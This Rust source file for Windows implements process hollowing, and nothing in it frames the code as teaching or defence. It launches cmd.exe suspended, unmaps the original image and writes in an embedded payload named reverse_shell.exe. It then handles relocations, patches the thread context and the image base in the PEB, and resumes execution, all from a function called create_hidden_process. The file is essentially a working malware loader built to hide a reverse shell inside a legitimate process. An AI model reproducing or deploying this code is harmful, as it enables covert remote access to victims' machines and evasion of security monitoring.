#![cfg(windows)]
use std::ffi::CString;
use std::io::{Error, Result};
use std::ptr::null_mut;
use std::{mem, ptr};
use winapi::shared::minwindef::{BOOL, DWORD, ULONG};
use winapi::shared::ntdef::{HANDLE, LARGE_INTEGER, NTSTATUS, PVOID};
use winapi::um::handleapi::CloseHandle;
use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
use winapi::um::memoryapi::{VirtualAlloc, VirtualFree};
use winapi::um::processthreadsapi::{CreateProcessA, GetExitCodeProcess, STARTUPINFOA, THREAD_INFORMATION_CLASS};
use winapi::um::winbase::CREATE_SUSPENDED;
use winapi::um::winnt::{BOOLEAN, CONTEXT_FULL, MEM_RESERVE};
use winapi::{
    ctypes::c_void,
    um::{
        memoryapi::{ReadProcessMemory, VirtualAllocEx, WriteProcessMemory},
        processthreadsapi::{GetThreadContext, ResumeThread, SetThreadContext},
        processthreadsapi::{TerminateProcess, PROCESS_INFORMATION}
        ,
        winnt::{
            CONTEXT, IMAGE_DOS_HEADER
            , MEM_COMMIT, MEM_RELEASE
        },
        winnt::PAGE_EXECUTE_READWRITE,
    },
};

const BUFFER_SIZE: usize = 4096;
const IMAGE_NT_OPTIONAL_HDR64_MAGIC: u16 = 0x20B;
const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;

#[repr(align(16))]
struct AlignedContext(CONTEXT);

unsafe extern "system" {
    fn NtQueryInformationThread(
        ThreadProcess: HANDLE,
        ThreadInformationClass: THREAD_INFORMATION_CLASS,
        ThreadInformation: PVOID,
        ThreadInformationLength: DWORD,
        ReturnLength: *mut DWORD,
    ) -> NTSTATUS;
}
type NtUnmapViewOfSection = unsafe extern "system" fn(
    process_handle: HANDLE,
    base_address: PVOID,
) -> NTSTATUS;

struct PebLdrData {
    Length: ULONG,
    Initialized: BOOL,
    SsHandle: PVOID,
    InLoadOrderModuleList: PVOID,
    InMemoryOrderModuleList: PVOID,
    InInitializationOrderModuleList: PVOID,
}
/*#[repr(C)]
struct ProcessAddressInformation {
    peb_address: PVOID,
    image_base_address: PVOID,
}*/

fn get_pe_magic(buffer: *const u8) -> Result<u16> {
    unsafe {
        let dos_header = buffer as *const IMAGE_DOS_HEADER;
        let nt_headers = (buffer as usize + (*dos_header).e_lfanew as usize) as *const ImageNtHeaders64;
        // println!("dos_header: {:p}", dos_header);
        // println!("nt_headers: {:p}", nt_headers);
        // println!("buffer: {:p}", buffer);
        Ok((*nt_headers).optional_header.magic)
    }
}
fn read_remote_pe_magic(process_handle: HANDLE, base_address: PVOID) -> Result<u16> {
    let mut buffer = vec![0u8; BUFFER_SIZE];

    let success = unsafe {
        ReadProcessMemory(
            process_handle,
            base_address,
            buffer.as_mut_ptr() as PVOID,
            BUFFER_SIZE,
            null_mut(),
        )
    };
    if success == 0 {
        return Err(Error::last_os_error());
    }
    get_pe_magic(buffer.as_ptr())
}

#[repr(C)]
struct RtlUserProcessParameters{
    MaximumLength: ULONG,
    Length: ULONG,
    Flags: ULONG,
    DebugFlags: ULONG,
    ConsoleHandle: PVOID,
    ConsoleFlags: ULONG,
    StandardInput: PVOID,
    StandardOutput: PVOID,
    StandardError: PVOID,
    CurrentDirectory: PVOID,
    CurrentDirectoryHandle: PVOID,
    DllPath: PVOID,
    ImagePathName: PVOID,
    CommandLine: PVOID,
    Environment: PVOID,
    StartingX: ULONG,
    StartingY: ULONG,
    Width: ULONG,
    Height: ULONG,
    CharWidth: ULONG,
    CharHeight: ULONG,
    ConsoleTextAttributes: ULONG,
    WindowFlags: ULONG,
    ShowWindowFlags: ULONG,
    WindowTitle: PVOID,
    DesktopName: PVOID,
    ShellInfo: PVOID,
    RuntimeData: PVOID,
    CurrentDirectories: [PVOID; 32],
}

#[repr(C)]
struct PebLockRoutine {
    PebLockRoutine: PVOID,
}

#[repr(C)]
struct PebFreeBlock {
    _PEB_FREE_BLOCK: [u8; 8],
    Size: ULONG,
}

#[repr(C)]
struct ProcessBasicInformation {
    reserved1: PVOID,
    peb_base_address: PVOID,
    reserved2: [PVOID; 2],
    unique_process_id: usize,
    reserved3: PVOID,
}

#[repr(C)]
struct PEB {
    inherited_address_space: BOOLEAN,
    read_image_file_exec_options: BOOLEAN,
    being_debugged: BOOLEAN,
    spare: BOOLEAN,
    mutant: HANDLE,
    image_base_address: PVOID,
    loader_data: *mut PebLdrData,
    process_parameters: *mut RtlUserProcessParameters,
    subsystem_data: PVOID,
    process_heap: PVOID,
    fast_peb_lock: PVOID,
    fast_peb_lock_routine: *mut PebLockRoutine,
    fast_peb_unlock_routine: *mut PebLockRoutine,
    environment_update_count: ULONG,
    kernel_callback_table: *mut PVOID,
    event_log_section: PVOID,
    event_log: PVOID,
    free_list: *mut PebFreeBlock,
    tls_expansion_counter: ULONG,
    tls_bitmap: PVOID,
    tls_bitmap_bits: [ULONG; 2],
    read_only_shared_memory_base: PVOID,
    read_only_shared_memory_heap: PVOID,
    read_only_static_server_data: *mut *mut PVOID,
    ansi_code_page_data: PVOID,
    oem_code_page_data: PVOID,
    unicode_case_table_data: PVOID,
    number_of_processors: ULONG,
    nt_global_flag: ULONG,
    spare2: [u8; 4],
    critical_section_timeout: LARGE_INTEGER,
    heap_segment_reserve: ULONG,
    heap_segment_commit: ULONG,
    heap_decommit_total_free_threshold: ULONG,
    heap_decommit_free_block_threshold: ULONG,
    number_of_heaps: ULONG,
    maximum_number_of_heaps: ULONG,
    process_heaps: *mut *mut PVOID,
    gdi_shared_handle_table: PVOID,
    process_starter_helper: PVOID,
    gdi_dc_attribute_list: PVOID,
    loader_lock: PVOID,
    os_major_version: ULONG,
    os_minor_version: ULONG,
    os_build_number: ULONG,
    os_platform_id: ULONG,
    image_subsystem: ULONG,
    image_subsystem_major_version: ULONG,
    image_subsystem_minor_version: ULONG,
    gdi_handle_buffer: [ULONG; 0x22],
    post_process_init_routine: ULONG,
    tls_expansion_bitmap: ULONG,
    tls_expansion_bitmap_bits: [u8; 0x80],
    session_id: ULONG,
}
#[repr(C)]
struct ImageDosHeader {
    e_magic: u16,
    e_cblp: u16,
    e_cp: u16,
    e_crlc: u16,
    e_cparhdr: u16,
    e_minalloc: u16,
    e_maxalloc: u16,
    e_ss: u16,
    e_sp: u16,
    e_csum: u16,
    e_ip: u16,
    e_cs: u16,
    e_lfarlc: u16,
    e_ovno: u16,
    e_res: [u16; 4],
    e_oemid: u16,
    e_oeminfo: u16,
    e_res2: [u16; 10],
    e_lfanew: i32,
}

#[repr(C)]
struct ImageFileHeader {
    machine: u16,
    number_of_sections: u16,
    time_date_stamp: u32,
    pointer_to_symbol_table: u32,
    number_of_symbols: u32,
    size_of_optional_header: u16,
    characteristics: u16,
}

#[repr(C)]
struct ImageOptionalHeader64 {
    magic: u16,
    major_linker_version: u8,
    minor_linker_version: u8,
    size_of_code: u32,
    size_of_initialized_data: u32,
    size_of_uninitialized_data: u32,
    address_of_entry_point: u32,
    base_of_code: u32,
    image_base: u64,
    section_alignment: u32,
    file_alignment: u32,
    major_operating_system_version: u16,
    minor_operating_system_version: u16,
    major_image_version: u16,
    minor_image_version: u16,
    major_subsystem_version: u16,
    minor_subsystem_version: u16,
    win32_version_value: u32,
    size_of_image: u32,
    size_of_headers: u32,
    check_sum: u32,
    subsystem: u16,
    dll_characteristics: u16,
    size_of_stack_reserve: u64,
    size_of_stack_commit: u64,
    size_of_heap_reserve: u64,
    size_of_heap_commit: u64,
    loader_flags: u32,
    number_of_rva_and_sizes: u32,
    data_directory: [ImageDataDirectory; 16],
}

#[repr(C)]
struct ImageNtHeaders64 {
    signature: u32,
    file_header: ImageFileHeader,
    optional_header: ImageOptionalHeader64,
}

#[repr(C)]
struct ImageSectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    pointer_to_relocations: u32,
    pointer_to_linenumbers: u32,
    number_of_relocations: u16,
    number_of_linenumbers: u16,
    characteristics: u32,
}


#[repr(C)]
struct LoadedImage {
    file_header: *mut ImageNtHeaders64,
    number_of_sections: u16,
    sections: *mut ImageSectionHeader,
}

#[repr(C)]
struct BaseRelocationBlock {
    page_address: u32,
    block_size: u32,
}

#[repr(C)]
struct BaseRelocationEntry {
    data: u16
}

impl BaseRelocationEntry {
    fn offset(&self) -> u16 {
        self.data & 0x0FFF
    }

    fn type_(&self) -> u16 {
        (self.data >> 12) & 0xF
    }
}
#[repr(C)]
#[derive(Debug, Copy, Clone)]
struct ImageDataDirectory {
    virtual_address: u32,
    size: u32,
}
#[repr(C)]
struct ImageImportDescriptor {
    characteristics: u32,
    time_date_stamp: u32,
    forwarder_chain: u32,
    name: u32,
    first_thunk: u32,
}

#[repr(C)]
struct ImageThunkData64 {
    u1: u64,
}

#[repr(C)]
struct ImageImportByName {
    hint: u16,
    name: [u8; 1],
}

type NtQueryInformationProcess = unsafe extern "system" fn(
    process_handle: HANDLE,
    process_information_class: DWORD,
    process_information: PVOID,
    process_information_length: ULONG,
    return_length: *mut ULONG,
) -> NTSTATUS;

fn init_nt_query_process() -> Option<NtQueryInformationProcess> {
    unsafe {
        let ntdll = LoadLibraryA("ntdll.dll\0".as_ptr() as *const i8);
        if ntdll.is_null() {
            return None;
        }
        let proc_addr = GetProcAddress(ntdll, b"NtQueryInformationProcess\0".as_ptr() as *const i8);
        if proc_addr.is_null() {
            return None;
        }
        Some(mem::transmute(proc_addr))
    }
}
fn find_remote_peb(process_handle: HANDLE) -> PVOID {
    let nt_query = match init_nt_query_process() {
        Some(f) => f,
        None => return null_mut()
    };

    let mut basic_info = ProcessBasicInformation {
        reserved1: null_mut(),
        peb_base_address: null_mut(),
        reserved2: [null_mut(); 2],
        unique_process_id: 0,
        reserved3: null_mut(),
    };
    let mut length = 0;
    unsafe {
       let status = nt_query (
           process_handle,
           0,
           &mut basic_info as *mut _ as PVOID,
           size_of::<ProcessBasicInformation>() as ULONG,
           &mut length
       );
        if status >= 0 {
            basic_info.peb_base_address
        } else {
            null_mut()
        }
    }
}
fn read_remote_peb(process_handle: HANDLE) -> Option<Box<PEB>> {
    let peb_address = find_remote_peb(process_handle);
    if peb_address.is_null() {
        return None;
    }

    let mut peb = Box::new(unsafe { mem::zeroed::<PEB>() });
    let success = unsafe {
        ReadProcessMemory(
            process_handle,
            peb_address,
            &mut *peb as *mut PEB as PVOID,
            size_of::<PEB>(),
            null_mut(),
        )
    };

    if success == 0 {
        None
    } else {
        Some(peb)
    }
}

fn read_remote_image(process_handle: HANDLE, image_address: PVOID) -> Option<Box<LoadedImage>> {
    let mut buffer = vec![0u8; BUFFER_SIZE];
    let ok = unsafe {
        ReadProcessMemory(
            process_handle,
            image_address,
            buffer.as_mut_ptr() as PVOID,
            BUFFER_SIZE,
            null_mut()
        )
    };
    if ok == 0 {return None;}

    unsafe {
        let dos_header = buffer.as_ptr() as *const ImageDosHeader;
        let nt_header = (buffer.as_ptr() as usize + (*dos_header).e_lfanew as usize) as *mut ImageNtHeaders64;

        let image = Box::new(LoadedImage{
            file_header: nt_header,
            number_of_sections: (*nt_header).file_header.number_of_sections,
            sections: (buffer.as_ptr() as usize + (*dos_header).e_lfanew as usize
                + size_of::<ImageNtHeaders64>()) as *mut ImageSectionHeader
        });
        Some(image)
    }
}
fn get_nt_headers(image: PVOID) -> *mut ImageNtHeaders64 {
    unsafe {
        let dos_header = image as *const ImageDosHeader;
        (image as usize + (*dos_header).e_lfanew as usize) as *mut ImageNtHeaders64
    }
}
fn get_loaded_image(image: PVOID) -> Box<LoadedImage> {
    unsafe {
        let dos_header = image as *const ImageDosHeader;
        let nt_headers = get_nt_headers(image);

        Box::new(LoadedImage {
            file_header: nt_headers,
            number_of_sections: (*nt_headers).file_header.number_of_sections,
            sections: (image as usize + (*dos_header).e_lfanew as usize +
                size_of::<ImageNtHeaders64>()) as *mut ImageSectionHeader,
        })
    }
}

fn get_nt_unmap_view_of_section() -> Option<NtUnmapViewOfSection> {
    unsafe {
        let ntdll = LoadLibraryA("ntdll.dll\0".as_ptr() as *const i8);
        if ntdll.is_null() {
           // println!("Failed to get ntdll handle");
            return None;
        }
        let addr = GetProcAddress(ntdll, b"NtUnmapViewOfSection\0".as_ptr() as *const i8);
        if addr.is_null() {
           // println!("Failed to get NtUnmapViewOfSection address");
            return None;
        }
        Some(mem::transmute(addr))
    }
}

fn count_reloc_entries(block_size: u32) -> u32 {
    (block_size - size_of::<BaseRelocationBlock>() as u32) /
        size_of::<BaseRelocationEntry>() as u32
}
fn has_relocation(buffer: *const u8) -> bool {
    unsafe {
        let dos_header = buffer as *const ImageDosHeader;
        let nt_header = (buffer as usize + (*dos_header).e_lfanew as usize) as *const ImageNtHeaders64;
       // println!("Relocation table address: 0x{:X}", (*nt_header).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].virtual_address);
        (*nt_header).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].virtual_address != 0
    }
}
fn get_reloc_address64(buffer: *const u8) -> ImageDataDirectory {
    unsafe {
        let dos_header = buffer as *const ImageDosHeader;
        let nt_headers = (buffer as usize + (*dos_header).e_lfanew as usize)
            as *const ImageNtHeaders64;

        if (*nt_headers).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].virtual_address != 0 {
            return (*nt_headers).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        }

        ImageDataDirectory {
            virtual_address: 0,
            size: 0,
        }
    }
}
fn run_pe(process_info: &PROCESS_INFORMATION, buffer: *const u8) -> bool {
    unsafe {
        let dos_header = buffer as *const ImageDosHeader;
        let nt_headers = (buffer as usize + (*dos_header).e_lfanew as usize)
            as *const ImageNtHeaders64;

        // Allocate memory in target process
        let alloc_addr = VirtualAllocEx(
            process_info.hProcess,
            (*nt_headers).optional_header.image_base as PVOID,
            (*nt_headers).optional_header.size_of_image as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if alloc_addr.is_null() {
            //println!("[-] An error occurred when trying to allocate memory for the new image.");
            VirtualFree(buffer as *mut c_void, 0, MEM_RELEASE);
            return false;
        }
            // println!("[+] Memory allocated at: {:p}", alloc_addr);

        // Write PE headers
        let write_headers = WriteProcessMemory(
            process_info.hProcess,
            alloc_addr,
            buffer as PVOID,
            (*nt_headers).optional_header.size_of_image as usize,
            null_mut()
        );

        if write_headers == 0 {
          //  println!("[-] An error occurred when trying to write the headers of the new image.");
            TerminateProcess(process_info.hProcess, 1);
            VirtualFree(buffer as *mut c_void, 0, MEM_RELEASE);

            return false;
        }
       // println!("[+] Headers written at: {:p}", (*nt_headers).optional_header.image_base as *const u8);

        // Write sections
        for i in 0..(*nt_headers).file_header.number_of_sections {
            let section_header = (nt_headers as usize +
                size_of::<u32>() +  // Skip NT signature
                size_of::<ImageFileHeader>() +
                (*nt_headers).file_header.size_of_optional_header as usize +
                (i as usize * size_of::<ImageSectionHeader>())) as *const ImageSectionHeader;

            let write_section = WriteProcessMemory(
                process_info.hProcess,
                (alloc_addr as usize + (*section_header).virtual_address as usize) as PVOID,
                (buffer as usize + (*section_header).pointer_to_raw_data as usize) as PVOID,
                (*section_header).size_of_raw_data as usize,
                null_mut()
            );

            if write_section == 0 {
                /*println!("[-] An error occurred when trying to write section: {}",
                         String::from_utf8_lossy(&(*section_header).name));*/
                return false;
            }
/*            println!("[+] Section {} written at: {:p}",
                     String::from_utf8_lossy(&(*section_header).name),
                     (alloc_addr as usize + (*section_header).virtual_address as usize) as *const u8);*/
        }

        //Context and writing image
        let mut aligned_context = AlignedContext(unsafe { mem::zeroed() });
        aligned_context.0.ContextFlags = CONTEXT_FULL;
        //context.ContextFlags = CUST_CONTEXT_FULL;

        if GetThreadContext(process_info.hThread, &mut aligned_context.0) == 0 {
           // println!("[-] An error occurred when trying to get the thread context.");
            return false;
        }
        let image_base = (*nt_headers).optional_header.image_base;
        let writed = WriteProcessMemory(
            process_info.hProcess,
            (aligned_context.0.Rdx + 0x10) as PVOID,
            &image_base as *const u64 as PVOID,
            size_of::<u64>(),
            null_mut()
        );
        if writed == 0 {
          //  println!("[-] An error occurred when trying to write the image base in the PEB.");
            return false;
        }

        aligned_context.0.Rcx = alloc_addr as u64 + (*nt_headers).optional_header.address_of_entry_point as u64;
        if SetThreadContext(process_info.hThread, &aligned_context.0) == 0 {
           // println!("[-] An error occurred when trying to set the thread context.");
            return false;
        }
        ResumeThread(process_info.hThread);
        true
    }
}
fn run_pe_reloc64(process_info: &PROCESS_INFORMATION,
                  buffer: *const u8) -> bool {
    unsafe {
        let dos_header = buffer as *const ImageDosHeader;
        let nt_headers = (buffer as usize + (*dos_header).e_lfanew as usize)
            as *mut ImageNtHeaders64;

        let alloc_address = VirtualAllocEx(
            process_info.hProcess,
            null_mut(),
            (*nt_headers).optional_header.size_of_image as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if alloc_address.is_null() {
            //println!("[-] An error occurred when trying to allocate memory for the new image.");
            return false;
        }
       // println!("[+] Memory allocated at: {:p}", alloc_address);

        let delta = alloc_address as u64 - (*nt_headers).optional_header.image_base;
        // println!("[+] Delta: 0x{:X}", delta);
        (*nt_headers).optional_header.image_base = alloc_address as u64;

        let write_headers = WriteProcessMemory(
            process_info.hProcess,
            alloc_address,
            buffer as PVOID,
            (*nt_headers).optional_header.size_of_headers as usize,
            null_mut()
        );

        if write_headers == 0 {
            //println!("[-] An error occurred when trying to write the headers of the new image.");
            return false;
        }
        //println!("[+] Headers written at: {:p}", alloc_address);

        // Get relocation directory info
        let image_data_reloc = get_reloc_address64(buffer);
        let mut reloc_section = null_mut();

        // Write sections and find relocation section
        for i in 0..(*nt_headers).file_header.number_of_sections {
            let section_header = (nt_headers as usize +
                size_of::<u32>() +  // Skip NT signature
                size_of::<ImageFileHeader>() +
                (*nt_headers).file_header.size_of_optional_header as usize +
                (i as usize * size_of::<ImageSectionHeader>())) as *const ImageSectionHeader;

            // Check if this is the relocation section
            if image_data_reloc.virtual_address >= (*section_header).virtual_address &&
                image_data_reloc.virtual_address < ((*section_header).virtual_address + (*section_header).virtual_size) {
                reloc_section = section_header as *mut ImageSectionHeader;
            }

            let write_section = WriteProcessMemory(
                process_info.hProcess,
                (alloc_address as usize + (*section_header).virtual_address as usize) as PVOID,
                (buffer as usize + (*section_header).pointer_to_raw_data as usize) as PVOID,
                (*section_header).size_of_raw_data as usize,
                null_mut()
            );

            if write_section == 0 {
/*                println!("[-] An error occurred when trying to write section: {}",
                         String::from_utf8_lossy(&(*section_header).name));*/
                return false;
            }
/*            println!("[+] Section {} written at: {:p}",
                     String::from_utf8_lossy(&(*section_header).name),
                     (alloc_address as usize + (*section_header).virtual_address as usize) as *const u8);*/
        }

        if reloc_section.is_null() {
         //   println!("[-] Failed to find relocation section.");
            return false;
        }

/*        println!("[+] Relocation section found: {}",
                 String::from_utf8_lossy(&(*reloc_section).name));*/

        // Process relocations
        let mut reloc_offset = 0u32;
        while reloc_offset < image_data_reloc.size {
            let base_relocation = (buffer as usize +
                (*reloc_section).pointer_to_raw_data as usize +
                reloc_offset as usize) as *const BaseRelocationBlock;

            reloc_offset += size_of::<BaseRelocationBlock>() as u32;

            let entries = count_reloc_entries((*base_relocation).block_size);
            if (*base_relocation).block_size < size_of::<BaseRelocationBlock>() as u32 {
                return false;
            }
            for _ in 0..entries {
                let entry = (buffer as usize +
                    (*reloc_section).pointer_to_raw_data as usize +
                    reloc_offset as usize) as *const BaseRelocationEntry;

                reloc_offset += size_of::<BaseRelocationEntry>() as u32;

                if (*entry).type_() == 0 {
                    continue;
                }

                let address_location = alloc_address as u64 +
                    (*base_relocation).page_address as u64 +
                    (*entry).offset() as u64;

                let mut patched_address: u64 = 0;
                ReadProcessMemory(
                    process_info.hProcess,
                    address_location as PVOID,
                    &mut patched_address as *mut u64 as PVOID,
                    size_of::<u64>(),
                    null_mut()
                );

                patched_address += delta;

                let mut write_result = 0;
                WriteProcessMemory(
                    process_info.hProcess,
                    address_location as PVOID,
                    &patched_address as *const u64 as PVOID,
                    size_of::<u64>(),
                    &mut write_result
                );

                if write_result == 0 {
                    return false;
                }
            }
           // println!("[+] Relocation block processed at 0x{:X}", (*base_relocation).page_address);
        }
       // println!("[+] Relocations processed successfully.");

       // println!("DBG: hProcess = {:?}, hThread = {:?}", process_info.hProcess, process_info.hThread);
        //let mut context: CONTEXT = mem::zeroed();
        //context.ContextFlags = CUST_CONTEXT_FULL;
        let mut aligned_context = AlignedContext(unsafe { mem::zeroed() });
        aligned_context.0.ContextFlags = CONTEXT_FULL;

        if GetThreadContext(process_info.hThread, &mut aligned_context.0) == 0 {
          //  println!("[-] An error occurred when trying to get the thread context. Error: {}", Error::last_os_error());
            return false;
        }

        // Update PEB with new image base
        if WriteProcessMemory(
            process_info.hProcess,
            (aligned_context.0.Rdx + 0x10) as PVOID,
            &alloc_address as *const PVOID as PVOID,
            size_of::<u64>(),
            null_mut()
        ) == 0 {
         //   println!("[-] An error occurred when trying to write the image base in the PEB.");
            return false;
        }

        aligned_context.0.Rcx = alloc_address as u64 + (*nt_headers).optional_header.address_of_entry_point as u64;

        if SetThreadContext(process_info.hThread, &aligned_context.0) == 0 {
           // println!("[-] An error occurred when trying to set the thread context.");
            return false;
        }

        ResumeThread(process_info.hThread);

        let mut exit_code: u32 = 0;
        unsafe { GetExitCodeProcess(process_info.hProcess, &mut exit_code as *mut u32) };
       // println!("Process exited with code: 0x{:X}", exit_code);

        true
    }
}
static PAYLOAD: &'static [u8] = include_bytes!(concat!(env!("OUT_DIR"), "/reverse_shell.exe"));
pub fn create_hidden_process() -> Result<()> {
/*    let payload_file = "src\\process_hollowing\\reverse_shell.exe";
    if !std::path::Path::new(payload_file).exists() {
        println!("Input file does not exist!");
        return Ok(());
    }

    let mut file = File::open(payload_file)?;
    let filesize = file.metadata()?.len() as usize;*/

    let filesize = PAYLOAD.len();
    let buffer = unsafe {
        VirtualAlloc(
            null_mut(),
            filesize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };
    if buffer.is_null() {return Err(Error::last_os_error())};

/*    let mut file_content = vec![0u8; filesize];
    file.read_exact(&mut file_content)?;*/

    unsafe {
        ptr::copy_nonoverlapping(
            //file_content.as_ptr(),
            PAYLOAD.as_ptr(),
            buffer as *mut u8,
            filesize
        )
    }
    let source_magic = get_pe_magic(buffer as *const u8)?;
    if source_magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC {
        panic!("32-bit arch doesn't support")
    }
    let process_name = CString::new("C:\\Windows\\System32\\cmd.exe")?;

    let mut si: STARTUPINFOA =  unsafe { mem::zeroed() };
    si.cb = size_of::<STARTUPINFOA>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { mem::zeroed() };

    let ok = unsafe {
        CreateProcessA(
            process_name.as_ptr(),
            null_mut(),
            null_mut(),
            null_mut(),
            true as i32,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi
        )
    };
    if ok == 0 {return Err(Error::last_os_error())};

    if let Some(peb) = read_remote_peb(pi.hProcess){
/*        println!("Successfully read process PEB");
        println!("Image base address: {:p}", peb.image_base_address);
        println!("PEB address {:p}", peb);*/

        let loaded_image = match read_remote_image(pi.hProcess, peb.image_base_address) {
            Some(image) => {
/*                println!("Successfully read remote image");
                println!("Number of sections: {}", image.number_of_sections);*/
                image
            }
            None => {
                //println!("Failed to read remote image");
                return Ok(());
            }
        };
        let source_magic = get_pe_magic(buffer as *const u8)?;
        if source_magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC {
            //println!("Source PE is not 64-bit (Magic: 0x{:X})", source_magic);
            unsafe { VirtualFree(buffer, 0, MEM_RELEASE) };
            return Ok(());
        }
        let target_magic = read_remote_pe_magic(pi.hProcess, peb.image_base_address)?;
        if target_magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC {
            //println!("Target process is not 64-bit (Magic: 0x{:X})", target_magic);
            unsafe {
                TerminateProcess(pi.hProcess, 1);
                VirtualFree(buffer, 0, MEM_RELEASE);
            }
            return Ok(());
        }
       // println!("Both source and target are 64-bit PE files");

        let nt_unmap_view_of_section = match get_nt_unmap_view_of_section() {
            Some(func) => func,
            None => {
         //       println!("Failed to get NtUnmapViewOfSection function");
                return Ok(());
            }
        };
        let result = unsafe {
            nt_unmap_view_of_section(
                pi.hProcess,
                peb.image_base_address
            )
        };

        if result != 0 {
            //println!("Error unmapping section: {}", result);
            return Ok(());
        }
      //  println!("Successfully unmapped section");

        let has_reloc = has_relocation(buffer as *const u8);
        if !has_reloc {
        //    println!("[+] The source image doesn't have a relocation table.");
            if run_pe(&pi, buffer as *const u8) {
             //   println!("[+] The injection has succeeded!");
                unsafe {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    VirtualFree(buffer, 0, MEM_RELEASE);
                }
                return Ok(());
            }
        }
        else {
           // println!("[+] The source image has a relocation table.");
            if run_pe_reloc64(&pi, buffer as *const u8) {
            //    println!("[+] The injection has succeeded!");
                unsafe {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    VirtualFree(buffer, 0, MEM_RELEASE);
                }
                return Ok(());
            }
        }

    }
    else {
       // println!("Failed to read process PEB");
    }
    Ok(())
}